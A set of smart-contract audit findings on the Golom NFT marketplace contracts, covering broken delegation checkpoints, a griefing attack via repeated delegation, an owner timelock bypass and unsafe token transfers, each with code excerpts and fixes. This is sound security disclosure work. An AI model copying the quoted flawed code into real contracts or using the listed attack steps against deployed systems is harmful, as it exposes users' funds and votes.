# Lines of code  https://github.com/code-423n4/2022-07-golom/blob/e5efa8f9d6dda92a90b8b2c4902320acf0c26816/contracts/vote-escrow/VoteEscrowCore.sol#L893-L908 https://github.com/code-423n4/2022-07-golom/blob/e5efa8f9d6dda92a90b8b2c4902320acf0c26816/contracts/vote-escrow/VoteEscrowCore.sol#L1004-L1030 https://github.com/code-423n4/2022-07-golom/blob/e5efa8f9d6dda92a90b8b2c4902320acf0c26816/contracts/vote-escrow/VoteEscrowCore.sol#L1226-L1236   # Vulnerability details  Golom is impacted by a known issue with the veNFT contract that causes the `merge` and `withdraw` functions to revert when called by an approved spender rather than the token owner.  `merge` and `withdraw` may both be called by either the token owner or an approved spender. Note that both of these functions check `_isApprovedOrOwner`:  [`VoteEscrowCore#merge`](https://github.com/code-423n4/2022-07-golom/blob/e5efa8f9d6dda92a90b8b2c4902320acf0c26816/contracts/vote-escrow/VoteEscrowCore.sol#L893-L908)  ```solidity     function merge(uint256 _from, uint256 _to) external {         require(attachments[_from] == 0 && !voted[_from], 'attached');         require(_from != _to);         require(_isApprovedOrOwner(msg.sender, _from));         require(_isApprovedOrOwner(msg.sender, _to));          LockedBalance memory _locked0 = locked[_from];         LockedBalance memory _locked1 = locked[_to];         uint256 value0 = uint256(int256(_locked0.amount));         uint256 end = _locked0.end >= _locked1.end ? _locked0.end : _locked1.end;          locked[_from] = LockedBalance(0, 0);         _checkpoint(_from, _locked0, LockedBalance(0, 0));         _burn(_from);         _deposit_for(_to, value0, end, _locked1, DepositType.MERGE_TYPE);     } ```  [`VoteEscrowCore#withdraw`](https://github.com/code-423n4/2022-07-golom/blob/e5efa8f9d6dda92a90b8b2c4902320acf0c26816/contracts/vote-escrow/VoteEscrowCore.sol#L1004-L1030)  ```solidity     /// @notice Withdraw all tokens for `_tokenId`     /// @dev Only possible if the lock has expired     function withdraw(uint256 _tokenId) external nonreentrant {         assert(_isApprovedOrOwner(msg.sender, _tokenId));         require(attachments[_tokenId] == 0 && !voted[_tokenId], 'attached');          LockedBalance memory _locked = locked[_tokenId];         require(block.timestamp >= _locked.end, "The lock didn't expire");         uint256 value = uint256(int256(_locked.amount));          locked[_tokenId] = LockedBalance(0, 0);         uint256 supply_before = supply;         supply = supply_before - value;          // old_locked can have either expired <= timestamp or zero end         // _locked has only 0 end         // Both can have >= 0 amount         _checkpoint(_tokenId, _locked, LockedBalance(0, 0));          assert(IERC20(token).transfer(msg.sender, value));          // Burn the NFT         _burn(_tokenId);          emit Withdraw(msg.sender, _tokenId, value, block.timestamp);         emit Supply(supply_before, supply_before - value);     } ```  However, both functions make internal calls to `_burn`, which does **not** handle the case of an approved caller correctly. The call to `_removeTokenFrom` on [L1234](https://github.com/code-423n4/2022-07-golom/blob/e5efa8f9d6dda92a90b8b2c4902320acf0c26816/contracts/vote-escrow/VoteEscrowCore.sol#L1234-L1235) passes `msg.sender` rather than the token `owner`, which will revert:  [`VoteEscrowCore#_burn`](https://github.com/code-423n4/2022-07-golom/blob/e5efa8f9d6dda92a90b8b2c4902320acf0c26816/contracts/vote-escrow/VoteEscrowCore.sol#L1226-L1236)  ```solidity     function _burn(uint256 _tokenId) internal {         require(_isApprovedOrOwner(msg.sender, _tokenId), 'caller is not owner nor approved');          address owner = ownerOf(_tokenId);          // Clear approval         approve(address(0), _tokenId);         // Remove token         _removeTokenFrom(msg.sender, _tokenId);         emit Transfer(owner, address(0), _tokenId);     } ```  **Impact:** Approved callers cannot `merge` or `withdraw` veNFTs. `merge` and `withdraw` may only be called by the token owner.  **Suggestion:**  Update `_burn` to pass token owner address rather than `msg.sender`:  ```solidity     function _burn(uint256 _tokenId) internal {         require(_isApprovedOrOwner(msg.sender, _tokenId), 'caller is not owner nor approved');          address owner = ownerOf(_tokenId);          // Clear approval         approve(address(0), _tokenId);         // Remove token         _removeTokenFrom(owner, _tokenId);         emit Transfer(owner, address(0), _tokenId);     } ```
# Lines of code  https://github.com/code-423n4/2022-07-golom/blob/e5efa8f9d6dda92a90b8b2c4902320acf0c26816/contracts/core/GolomTrader.sol#L342 https://github.com/code-423n4/2022-07-golom/blob/e5efa8f9d6dda92a90b8b2c4902320acf0c26816/contracts/core/GolomTrader.sol#L397   # Vulnerability details  ## Impact `fillCriteriaBid` can be reverted due to the pre-check while it can work.  ## Proof of Concept When `refererrAmt > 0` and `referrer` address is not set (is 0),  `(o.totalAmt - protocolfee - o.exchange.paymentAmt - o.prePayment.paymentAmt) * amount - p.paymentAmt >= 0` and `o.totalAmt < o.exchange.paymentAmt + o.prePayment.paymentAmt + o.refererrAmt` can hold true at the same time.  It is when `o.refererrAmt > (p.paymentAmt + protocolfee) / amount`. In that case, `_settleBalances` can work, but fillCriteriaBid will be reverted due to the check in line 342.   ## Tools Used Manual review  ## Recommended Mitigation Steps I think `require(o.totalAmt >= o.exchange.paymentAmt + o.prePayment.paymentAmt)` is correct.
# Lines of code  https://github.com/code-423n4/2022-07-golom/blob/e5efa8f9d6dda92a90b8b2c4902320acf0c26816/contracts/vote-escrow/VoteEscrowDelegation.sol#L213   # Vulnerability details  ## Impact A user who has delegated the vote of a veGolom token (that he/she owns) to another veGolom token cannot remove the delegation, so the delegatee token will permanently hold the voting power of the delegator token.   ## Proof of Concept A user tries to remove the delegation from `tokenId` he/she owns to the delegated token, calling `removeDelegation(uint256 tokenId)`.  The delegation should be removed at the lines:  ```solidity         Checkpoint storage checkpoint = checkpoints[tokenId][nCheckpoints - 1];         removeElement(checkpoint.delegatedTokenIds, tokenId); ``` but the array `checkpoint.delegatedTokenIds` is the list of **delegators** to `tokenId` **itself**. So, unless the delegation was from the token to itself, `removeDelegation` does nothing.  ## Recommended Mitigation Steps Two fixes are proposed:  1. Add the delegatee as an argument to `removeDelegation` and remove `tokenId` from its list of delegators:     ```diff -   function removeDelegation(uint256 tokenId) external { +   function removeDelegation(uint256 tokenId, uint256 toTokenId) external {         require(ownerOf(tokenId) == msg.sender, 'VEDelegation: Not allowed');         uint256 nCheckpoints = numCheckpoints[tokenId]; -       Checkpoint storage checkpoint = checkpoints[tokenId][nCheckpoints - 1]; +       Checkpoint storage checkpoint = checkpoints[toTokenId][nCheckpoints - 1];         removeElement(checkpoint.delegatedTokenIds, tokenId);         _writeCheckpoint(tokenId, nCheckpoints, checkpoint.delegatedTokenIds);     } ```  or  2. Load the delegatee from the mapping `delegates` which maps each delegator to its current delegatee:  ```diff     function removeDelegation(uint256 tokenId) external {         require(ownerOf(tokenId) == msg.sender, 'VEDelegation: Not allowed'); +       uint256 toTokenId = delegates[tokenId];         uint256 nCheckpoints = numCheckpoints[tokenId]; -       Checkpoint storage checkpoint = checkpoints[tokenId][nCheckpoints - 1]; +       Checkpoint storage checkpoint = checkpoints[toTokenId][nCheckpoints - 1];         removeElement(checkpoint.delegatedTokenIds, tokenId);         _writeCheckpoint(tokenId, nCheckpoints, checkpoint.delegatedTokenIds);     } ```
# Lines of code  https://github.com/code-423n4/2022-07-golom/blob/e5efa8f9d6dda92a90b8b2c4902320acf0c26816/contracts/vote-escrow/VoteEscrowCore.sol#L873-L876 https://github.com/code-423n4/2022-07-golom/blob/e5efa8f9d6dda92a90b8b2c4902320acf0c26816/contracts/vote-escrow/VoteEscrowCore.sol#L883-L886 https://github.com/code-423n4/2022-07-golom/blob/e5efa8f9d6dda92a90b8b2c4902320acf0c26816/contracts/vote-escrow/VoteEscrowCore.sol#L894 https://github.com/code-423n4/2022-07-golom/blob/e5efa8f9d6dda92a90b8b2c4902320acf0c26816/contracts/vote-escrow/VoteEscrowCore.sol#L538 https://github.com/code-423n4/2022-07-golom/blob/e5efa8f9d6dda92a90b8b2c4902320acf0c26816/contracts/vote-escrow/VoteEscrowCore.sol#L1008   # Vulnerability details  ## Impact A malicious voter can arbitrarily increase the number of `attachments` or set the `voted` status of a token to true. This prevents the token from being withdrawn, merged or transfered thereby locking the tokens into the contract for as long as the voter would like.   I submitted this is as a medium severity because it has external circumstances (a malicious voter) however has a very high impact if it does occur.  ## Proof of Concept 1. A user creates a lock for their token and deposits it into the VoteEscrowDelegate/Core contract. 2. The malicious voter then calls either `voting()` or `attach()` thereby preventing the user withdrawing their token after the locked time bypasses  ## Tools Used VS Code ## Recommended Mitigation Steps I have not seen any use of `voting()` or `attach()` in any of the other contracts so it may be sensible to remove those functions altogether. On the other hand, setting voter to be smart contract which is not malicious offsets this problem.
# Lines of code  https://github.com/code-423n4/2022-07-golom/blob/e5efa8f9d6dda92a90b8b2c4902320acf0c26816/contracts/vote-escrow/VoteEscrowDelegation.sol#L99 https://github.com/code-423n4/2022-07-golom/blob/e5efa8f9d6dda92a90b8b2c4902320acf0c26816/contracts/vote-escrow/VoteEscrowDelegation.sol#L71-L89   # Vulnerability details  ## Impact Similar to a previous submission, there are no checks preventing against delegating the same lock NFT multiple times. This opens an avenue to an expensive but potentially profitable griefing attack where the malicious user fills the victim's delegated token array with minimum voting power. The attacker can ensure that a delegatee has 0 voting power.  ## Proof of Concept Taking a look at the `delegate()` function below, there are no checks that a lock NFT has not already been delegated. Therefore, an attacker can delegate their token with minimum voting power (threshold initialized with value 0) to the victim.   ```     function delegate(uint256 tokenId, uint256 toTokenId) external {         require(ownerOf(tokenId) == msg.sender, 'VEDelegation: Not allowed');         require(this.balanceOfNFT(tokenId) >= MIN_VOTING_POWER_REQUIRED, 'VEDelegation: Need more voting power');           delegates[tokenId] = toTokenId;         uint256 nCheckpoints = numCheckpoints[toTokenId];           if (nCheckpoints > 0) {             Checkpoint storage checkpoint = checkpoints[toTokenId][nCheckpoints - 1];             checkpoint.delegatedTokenIds.push(tokenId);             _writeCheckpoint(toTokenId, nCheckpoints, checkpoint.delegatedTokenIds);         } else {             uint256[] memory array = new uint256[](1);             array[0] = tokenId;             _writeCheckpoint(toTokenId, nCheckpoints, array);         }           emit DelegateChanged(tokenId, toTokenId, msg.sender);     } ```  There is a limit of 500 delegated tokens per delegatee. Therefore, the attacker can ensure minimum voting power if they delegate a worthless token 500 times to the victim:  ```     function _writeCheckpoint(         uint256 toTokenId,         uint256 nCheckpoints,         uint256[] memory _delegatedTokenIds     ) internal {         require(_delegatedTokenIds.length < 500, 'VVDelegation: Cannot stake more'); ```  A more likely scenario would be as follows: - A proposal is live. - Users delegate their voting power to addresses of their choosing. - A and B are around the same voting power. - A and B both have 400 delegatees. - Malicious address A delegates minimum voting power 100 times to fill B's array to 500. - Address A can self-delegate just a bit more to obtain more voting power.   ## Tools Used Manual review.  ## Recommended Mitigation Steps Firstly, removing the ability to delegate the same lock NFT would make this griefing attack much more expensive. Even if that is patched, a griefing attack is still possible by simply creating more locks and delegating them all once.   I believe that removing the 500 delegated token limit would prove to mitigate this issue.
# Lines of code  https://github.com/code-423n4/2022-07-golom/blob/7bbb55fca61e6bae29e57133c1e45806cbb17aa4/contracts/governance/GolomToken.sol#L58-L72 https://github.com/code-423n4/2022-07-golom/blob/7bbb55fca61e6bae29e57133c1e45806cbb17aa4/contracts/core/GolomTrader.sol#L444-L457 https://github.com/code-423n4/2022-07-golom/blob/7bbb55fca61e6bae29e57133c1e45806cbb17aa4/contracts/rewards/RewardDistributor.sol#L298-L311   # Vulnerability details  ## Impact  MED - Function could be impacted  As the timelock does not work as supposed to work, the owner of the contract can bypass timelock.  - effected Functions:   - `GolomToken`: `setMinter`, `executeSetMinter`   - `GolomTrader`: `setDistributor`, `executeSetDistributor`   - `RewardDistributor`: `addVoteEscrow`, `executeAddVoteEscrow`   ## Proof of Concept  - [GolomTrader::it can bypass timelock poc](https://gist.github.com/zzzitron/6f950a268d179218cadef74d7acdeeb4#file-2022-07-pocgolomtrader-specs-ts-diff-L15-L26) - [GolomToken::setMinter it should set the minter with timelock poc](https://gist.github.com/zzzitron/6f950a268d179218cadef74d7acdeeb4#file-2022-07-pocgolomtoken-specs-ts-diff-L10-L29)   The [first poc](https://gist.github.com/zzzitron/6f950a268d179218cadef74d7acdeeb4#file-2022-07-pocgolomtrader-specs-ts-diff-L15-L26 ) shows to bypass timelock for `GolomTrader::setDistributor`. The same logic applies for the `RewardDistributor::addVoteEscrow`. 0. The `setDistributor` was called once in the beforeEach block to set the initial distributor. For this exploit to work, the `setDistributor` should be called only once. If `setDistributor` was called more than once, one can set the distributor to zero address (with timelock like in the `GolomToken` case, then set to a new distributor after that) 1. reset distributor to zero address without timelock by calling `executeSetDistributor` 2. set a new distributor without timelock by calling `setDistributor` 3. Rinse and repeat: as long as `setDistributor` is not called multiple times in row, the owner can keep setting distributor without timelock.   A little bit different variation of timelock bypass was found in the `GolomToken`. Although the owner should wait for the timelock to set the minter to zero address, but after that, the owner can set to the new minter without waiting for a timelock. Since the meaning of timelock is to let people know the new minter's implementation, if the owner can bypass that, the timelock is almost meaningless. The exploitation steps: [the second proof of concept](https://gist.github.com/zzzitron/6f950a268d179218cadef74d7acdeeb4#file-2022-07-pocgolomtoken-specs-ts-diff-L10-L29 ) 1. call `setMineter` with zero address 2. wait for the timelock 3. call `executeSetMineter` to set the minter to zero address 4. now the onwer can call `setMineter` with any address and call `executeSetMinter` without waiting for the timelock   The owner can call `executeSetdistributor` even though there is no `pendingDistributor` set before. Also, `setDistributor` sets the new distributor without timelock when the existing distributor's address is zero.  ```solidity // GolomTrader // almost identical logic was used in `RewardDistributor` to addVoteEscrow // similar logic was used in `GolomToken` to `setMineter`   444     function setDistributor(address _distributor) external onlyOwner { 445         if (address(distributor) == address(0)) { 446             distributor = Distributor(_distributor); 447         } else { 448             pendingDistributor = _distributor; 449             distributorEnableDate = block.timestamp + 1 days; 450         } 451     } 452 453     /// @notice Executes the set distributor function after the timelock 454     function executeSetDistributor() external onlyOwner { 455         require(distributorEnableDate <= block.timestamp, 'not allowed'); 456         distributor = Distributor(pendingDistributor); 457     } ```   ## Tools Used  None  ## Recommended Mitigation Steps  To mitigate, execute functions can check whether pendingDistributor is not zero. It will ensure that the setters are called before executing them, as well as prevent to set to zero addresses.  <!-- zzzitron 01M -->    
# Lines of code  https://github.com/code-423n4/2022-07-golom/blob/main/contracts/vote-escrow/VoteEscrowDelegation.sol#L242 https://github.com/code-423n4/2022-07-golom/blob/main/contracts/vote-escrow/VoteEscrowDelegation.sol#L211   # Vulnerability details  ## Impact  `VoteEscrowDelegation._transferFrom` should be successfully executed if `msg.sender` is the current owner, an authorized operator, or the approved address. `removeDelegation` is called in `_transferFrom`. `removeDelegation` only accepts the token owner. Thus, `_transferFrom` can only be executed by the token owner.  ## Proof of Concept  `removeDelegation` is called in `_transferFrom` https://github.com/code-423n4/2022-07-golom/blob/main/contracts/vote-escrow/VoteEscrowDelegation.sol#L242 ```     function _transferFrom(         address _from,         address _to,         uint256 _tokenId,         address _sender     ) internal override {         require(attachments[_tokenId] == 0 && !voted[_tokenId], 'attached');          // remove the delegation         this.removeDelegation(_tokenId);          // Check requirements         require(_isApprovedOrOwner(_sender, _tokenId));         …     } ```  However, `removeDelegation` only accept the token owner https://github.com/code-423n4/2022-07-golom/blob/main/contracts/vote-escrow/VoteEscrowDelegation.sol#L211 ```     function removeDelegation(uint256 tokenId) external {         require(ownerOf(tokenId) == msg.sender, 'VEDelegation: Not allowed');         uint256 nCheckpoints = numCheckpoints[tokenId];         Checkpoint storage checkpoint = checkpoints[tokenId][nCheckpoints - 1];         removeElement(checkpoint.delegatedTokenIds, tokenId);         _writeCheckpoint(tokenId, nCheckpoints, checkpoint.delegatedTokenIds);     } ```  ## Tools Used  None  ## Recommended Mitigation Steps  Fix the permission control in `removeDelegation`   
# Lines of code  https://github.com/code-423n4/2022-07-golom/blob/main/contracts/vote-escrow/VoteEscrowDelegation.sol#L101 https://github.com/code-423n4/2022-07-golom/blob/main/contracts/vote-escrow/VoteEscrowDelegation.sol#L82-L86   # Vulnerability details  ## Impact  When a user call `VoteEscrowDelegation.delegate` to make a delegation, it calls `VoteEscrowDelegation._writeCheckpoint` to update the checkpoint of `toTokenId`. However, if `nCheckpoints` is 0, `_writeCheckpoint` always reverts. What’s worse, `nCheckpoints` would be zero before any delegation has been made. In conclusion, users cannot make any delegation.  ## Proof of Concept  When a user call `VoteEscrowDelegation.delegate` to make a delegation, it calls `VoteEscrowDelegation._writeCheckpoint` to update the checkpoint of `toTokenId`. https://github.com/code-423n4/2022-07-golom/blob/main/contracts/vote-escrow/VoteEscrowDelegation.sol#L82-L86 ```     function delegate(uint256 tokenId, uint256 toTokenId) external {         require(ownerOf(tokenId) == msg.sender, 'VEDelegation: Not allowed');         require(this.balanceOfNFT(tokenId) >= MIN_VOTING_POWER_REQUIRED, 'VEDelegation: Need more voting power');          delegates[tokenId] = toTokenId;         uint256 nCheckpoints = numCheckpoints[toTokenId];          if (nCheckpoints > 0) {             Checkpoint storage checkpoint = checkpoints[toTokenId][nCheckpoints - 1];             checkpoint.delegatedTokenIds.push(tokenId);             _writeCheckpoint(toTokenId, nCheckpoints, checkpoint.delegatedTokenIds);         } else {             uint256[] memory array = new uint256[](1);             array[0] = tokenId;             _writeCheckpoint(toTokenId, nCheckpoints, array);         }          emit DelegateChanged(tokenId, toTokenId, msg.sender);     } ```  if `nCheckpoints` is 0, `_writeCheckpoint` always reverts. Because `checkpoints[toTokenId][nCheckpoints - 1]` will trigger underflow in Solidity 0.8.11 https://github.com/code-423n4/2022-07-golom/blob/main/contracts/vote-escrow/VoteEscrowDelegation.sol#L101 ```     function _writeCheckpoint(         uint256 toTokenId,         uint256 nCheckpoints,         uint256[] memory _delegatedTokenIds     ) internal {         require(_delegatedTokenIds.length < 500, 'VVDelegation: Cannot stake more');          Checkpoint memory oldCheckpoint = checkpoints[toTokenId][nCheckpoints - 1];         …     } ```  ## Tools Used  None  ## Recommended Mitigation Steps  Fix `_writeCheckpoint`  ```     function _writeCheckpoint(         uint256 toTokenId,         uint256 nCheckpoints,         uint256[] memory _delegatedTokenIds     ) internal {         require(_delegatedTokenIds.length < 500, 'VVDelegation: Cannot stake more');               if (nCheckpoints > 0 && oldCheckpoint.fromBlock == block.number) {             Checkpoint memory oldCheckpoint = checkpoints[toTokenId][nCheckpoints - 1];             oldCheckpoint.delegatedTokenIds = _delegatedTokenIds;         } else {             checkpoints[toTokenId][nCheckpoints] = Checkpoint(block.number, _delegatedTokenIds);             numCheckpoints[toTokenId] = nCheckpoints + 1;         }     } ```   
# Lines of code  https://github.com/code-423n4/2022-07-golom/blob/e5efa8f9d6dda92a90b8b2c4902320acf0c26816/contracts/vote-escrow/VoteEscrowDelegation.sol#L168-L194   # Vulnerability details  ## Impact When MIN_VOTING_POWER_REQUIRED is changed, tokenIDs with votes lower than MIN_VOTING_POWER_REQUIRED will not be able to vote through the delegate function, but previous votes will not be affected. Since MIN_VOTING_POWER_REQUIRED is mainly used to reduce the influence of spam users, changing this value should affect previous votes. ## Proof of Concept https://github.com/code-423n4/2022-07-golom/blob/e5efa8f9d6dda92a90b8b2c4902320acf0c26816/contracts/vote-escrow/VoteEscrowDelegation.sol#L168-L194 https://github.com/code-423n4/2022-07-golom/blob/e5efa8f9d6dda92a90b8b2c4902320acf0c26816/contracts/vote-escrow/VoteEscrowDelegation.sol#L260-L262 https://github.com/code-423n4/2022-07-golom/blob/e5efa8f9d6dda92a90b8b2c4902320acf0c26816/contracts/vote-escrow/VoteEscrowDelegation.sol#L73-L74 ## Tools Used None ## Recommended Mitigation Steps In the getPriorVotes and getVotes functions, when the balance corresponding to tokenId is less than MIN_VOTING_POWER_REQUIRED, the value of votes will not be increased ```diff     function getVotes(uint256 tokenId) external view returns (uint256) {         uint256[] memory delegated = _getCurrentDelegated(tokenId);         uint256 votes = 0;         for (uint256 index = 0; index < delegated.length; index++) { +         if(this.balanceOfNFT(delegated[index]) >= MIN_VOTING_POWER_REQUIRED){             votes = votes + this.balanceOfNFT(delegated[index]); +       }         }         return votes;     }       /**      * @notice Determine the prior number of votes for an account as of a block number      * @dev Block number must be a finalized block or else this function will revert to prevent misinformation.      * @param tokenId The address of the account to check      * @param blockNumber The block number to get the vote balance at      * @return The number of votes the account had as of the given block      */     function getPriorVotes(uint256 tokenId, uint256 blockNumber) public view returns (uint256) {         require(blockNumber < block.number, 'VEDelegation: not yet determined');         uint256[] memory delegatednft = _getPriorDelegated(tokenId, blockNumber);         uint256 votes = 0;         for (uint256 index = 0; index < delegatednft.length; index++) { +         if(this.balanceOfAtNFT(delegatednft[index], blockNumber) >= MIN_VOTING_POWER_REQUIRED){             votes = votes + this.balanceOfAtNFT(delegatednft[index], blockNumber); +         }         }         return votes;     } ```
# Lines of code  https://github.com/code-423n4/2022-07-golom/blob/e5efa8f9d6dda92a90b8b2c4902320acf0c26816/contracts/rewards/RewardDistributor.sol#L300 https://github.com/code-423n4/2022-07-golom/blob/e5efa8f9d6dda92a90b8b2c4902320acf0c26816/contracts/rewards/RewardDistributor.sol#L173   # Vulnerability details  ## Impact  On the initial `RewardDistributor.addVoteEscrow` call, the owner of the contract can set the `ve` address without a timelock (which is as intended according to the function documentation). However, as the function parameter `_voteEscrow` is not used for the assignment, instead the storage variable `pendingVoteEscrow` (which is not initialized, hence `address(0)`) is used, the `ve` storage variable can not be set to the provided `_voteEscrow` address.  This prevents setting the `ve` address (`ve` is set to `address(0)`) and therefore prevents `veNFT` holders to claim reward tokens and Ether rewards via `RewardDistributor.multiStakerClaim`.  ## Proof of Concept  [RewardDistributor.sol#L300](https://github.com/code-423n4/2022-07-golom/blob/e5efa8f9d6dda92a90b8b2c4902320acf0c26816/contracts/rewards/RewardDistributor.sol#L300)  ```solidity function addVoteEscrow(address _voteEscrow) external onlyOwner {     if (address(ve) == address(0)) {         ve = VE(pendingVoteEscrow); // @audit-info The wrong variable is used. It should be `_voteEscrow`     } else {         voteEscrowEnableDate = block.timestamp + 1 days;         pendingVoteEscrow = _voteEscrow;     } } ```  [RewardDistributor.sol#L173](https://github.com/code-423n4/2022-07-golom/blob/e5efa8f9d6dda92a90b8b2c4902320acf0c26816/contracts/rewards/RewardDistributor.sol#L173)  ```solidity function multiStakerClaim(uint256[] memory tokenids, uint256[] memory epochs) public {     require(address(ve) != address(0), ' VE not added yet'); // @audit-info reverts if `ve` is not initialized      ... } ```  ## Tools Used  Manual review  ## Recommended mitigation steps  Use the correct function parameter `_voteEscrow`:  ```solidity function addVoteEscrow(address _voteEscrow) external onlyOwner {     if (address(ve) == address(0)) {         ve = VE(_voteEscrow);     } else {         voteEscrowEnableDate = block.timestamp + 1 days;         pendingVoteEscrow = _voteEscrow;     } } ``` 
# Lines of code  https://github.com/OpenZeppelin/openzeppelin-contracts/blob/ce0068c21ecd97c6ec8fb0db08570f4b43029dde/contracts/token/ERC721/ERC721.sol#L395-L417   # Vulnerability details  ## Impact  While `VoteEscrowCore.safeTransferFrom` does try to call `onERC721Received` on the receiver it does not check the for the required "magic bytes" which is `IERC721.onERC721received.selector` in this case. See [OpenZeppelin docs](https://docs.openzeppelin.com/contracts/3.x/api/token/erc721#IERC721Receiver-onERC721Received-address-address-uint256-bytes-) for more information.  It's quite possible that a call to `onERC721Received` could succeed because the contract had a `fallback` function implemented, but the contract is not ERC721 compliant.  The impact is that NFT tokens may be sent to non-compliant contracts and lost.  ## Proof of Concept  [Lines 604 - 605](https://github.com/code-423n4/2022-07-golom/blob/e5efa8f9d6dda92a90b8b2c4902320acf0c26816/contracts/vote-escrow/VoteEscrowCore.sol#L604-L605) are:  ```solidity try IERC721Receiver(_to).onERC721Received(msg.sender, _from, _tokenId, _data) returns (bytes4) {} catch (     bytes memory reason ```  but they should be:  ```solidity try IERC721Receiver(to).onERC721Received(_msgSender(), from, tokenId, data) returns (bytes4 retval) {     return retval == IERC721Receiver.onERC721Received.selector; } catch (bytes memory reason) ```  ## Recommended Mitigation Steps  Implement `safeTransferReturn` so that it checks the required magic bytes: `IERC721Receiver.onERC721Received.selector`. 
# Lines of code  https://github.com/golom-protocol/contracts/blob/4e84d5c2115d163ca54a1729da46164e8cf4df6d/contracts/vote-escrow/VoteEscrowDelegation.sol#L101-L108   # Vulnerability details  ## Impact In `VoteEscrowDelegation._writeCheckpoint`, when the checkpoint is overwritten in the same block the new value is set with `memory oldCheckpoint` and thus is never written to storage.  ```javascript Checkpoint memory oldCheckpoint = checkpoints[toTokenId][nCheckpoints - 1];  if (nCheckpoints > 0 && oldCheckpoint.fromBlock == block.number) {  oldCheckpoint.delegatedTokenIds = _delegatedTokenIds;  } ```  Users that remove and delegate a token (or call `delegate` on the same token twice) in the same block will only have their first delegation persisted.  ## Proof of Concept - User delegates a `tokenId` by calling `delegate`. - In the same block, the user decides to delgate the same token to a different token ID and calls `delegate` again which calls `_writeCheckpoint`.  Since this is the second transaction in the same block the if statement in the code block above executes and stores `_delegatedTokenIds` in `memory oldCheckpoint`, thus not persisting the array of `_delegatedTokenIds` in the checkpoint.  ## Tools Used  Manual analysis  ## Recommended Mitigation Steps Define the `oldCheckpoint` variable as a `storage` pointer:  `Checkpoint storage oldCheckpoint = checkpoints[toTokenId][nCheckpoints - 1];` 
# Lines of code  https://github.com/code-423n4/2022-07-golom/blob/7bbb55fca61e6bae29e57133c1e45806cbb17aa4/contracts/core/GolomTrader.sol#L98   # Vulnerability details  ## Impact If there is ever a hardfork for Golom then EIP712_DOMAIN_TYPEHASH value will become invalid. This is because the chainId parameter is computed in constructor. This means even after hard fork chainId would remain same which is incorrect and could cause possible replay attacks  ## Proof of Concept 1. Observe the constructor  ``` constructor(address _governance) {         // sets governance as owner         _transferOwnership(_governance);          uint256 chainId;         assembly {             chainId := chainid()         }          EIP712_DOMAIN_TYPEHASH = keccak256(             abi.encode(                 keccak256('EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)'),                 keccak256(bytes('GOLOM.IO')),                 keccak256(bytes('1')),                 chainId,                 address(this)             )         );     } ```  2. As we can see the chainId is derived and then hardcoded in EIP712_DOMAIN_TYPEHASH   3. This means even after hard fork, EIP712_DOMAIN_TYPEHASH value will remain same and point to incorrect chainId  ## Recommended Mitigation Steps The EIP712_DOMAIN_TYPEHASH variable should be recomputed everytime by placing current value of chainId
# Lines of code  https://github.com/code-423n4/2022-07-golom/blob/e5efa8f9d6dda92a90b8b2c4902320acf0c26816/contracts/vote-escrow/VoteEscrowDelegation.sol#L242 https://github.com/code-423n4/2022-07-golom/blob/e5efa8f9d6dda92a90b8b2c4902320acf0c26816/contracts/vote-escrow/VoteEscrowDelegation.sol#L211   # Vulnerability details  ## Impact The `VoteEscrowDelegation._transferFrom` function won't work because it calls `this.removeDelegation(_tokenId)`. The `removeDelegation` function is external, so when the call is done by `this.removeDelegation(_tokenId)` msg.sender changes to the contract address.  This causes the check in the `` function to (most likely) fail because the contract is not the owner of the NFT, and that will make the function revert. `require(ownerOf(tokenId) == msg.sender, 'VEDelegation: Not allowed');`  ## Tools Used Manual audit (VS Code & my mind)  ## Recommended Mitigation Steps Make the `removeDelegation` function public and call it without changing the context (i.e. without changing msg.sender to the contract's address). 
# Lines of code  https://github.com/code-423n4/2022-07-golom/blob/main/contracts/core/GolomTrader.sol#L154   # Vulnerability details  ### Impact  [L154](https://github.com/code-423n4/2022-07-golom/blob/main/contracts/core/GolomTrader.sol#L154) in [GolomTrader.sol](https://github.com/code-423n4/2022-07-golom/blob/main/contracts/core/GolomTrader.sol) uses `.transfer()` to send ether to other addresses. There are a number of issues with using `.transfer()`, as it can fail for a number of reasons (specified in the Proof of Concept).  ### Proof of Concept  1. The destination is a smart contract that doesn’t implement a `payable` function or it implements a `payable` function but that function uses more than 2300 gas units. 2. The destination is a smart contract that doesn’t implement a `payable` `fallback` function or it implements a `payable` `fallback` function but that function uses more than 2300 gas units. 3. The destination is a smart contract but that smart contract is called via an intermediate proxy contract increasing the case requirements to more than 2300 gas units. A further example of unknown destination complexity is that of a multisig wallet that as part of its operation uses more than 2300 gas units. 4. Future changes or forks in Ethereum result in higher gas fees than transfer provides. The `.transfer()` creates a hard dependency on 2300 gas units being appropriate now and into the future.  ### Tools Used  Vim  ### Recommended Remediation Steps  Instead use the `.call()` function to transfer ether and avoid some of the limitations of `.transfer()`. This would be accomplished by changing `payEther()` to something like;  ```solidity (bool success, ) = payable(payAddress).call{value: payAmt}(""); // royalty transfer to royaltyaddress require(success, "Transfer failed."); ```  Gas units can also be passed to the `.call()` function as a variable to accomodate any uses edge cases. Gas could be a mutable state variable that can be set by the contract owner. 
# Lines of code  https://github.com/code-423n4/2022-07-golom/blob/7bbb55fca61e6bae29e57133c1e45806cbb17aa4/contracts/core/GolomTrader.sol#L236   # Vulnerability details  ## Impact Use of transferFrom method for ERC721 transfer is discouraged and recommended to use safeTransferFrom  whenever possible by OpenZeppelin. This is because transferFrom() cannot check whether the receiving address know how to handle ERC721 tokens.  In the function shown at below PoC, ERC721 token is sent to msg.sender with the transferFrom method. If this msg.sender is a contract and is not aware of incoming ERC721 tokens, the sent token could be locked up in the contract forever.  Reference: https://docs.openzeppelin.com/contracts/3.x/api/token/erc721  ## Proof of Concept ``` GolomTrader.sol:236:            ERC721(o.collection).transferFrom(o.signer, receiver, o.tokenId); ```  ## Tools Used Manual Analysis  ## Recommended Mitigation Steps I recommend to call the safeTransferFrom() method instead of transferFrom() for NFT transfers.
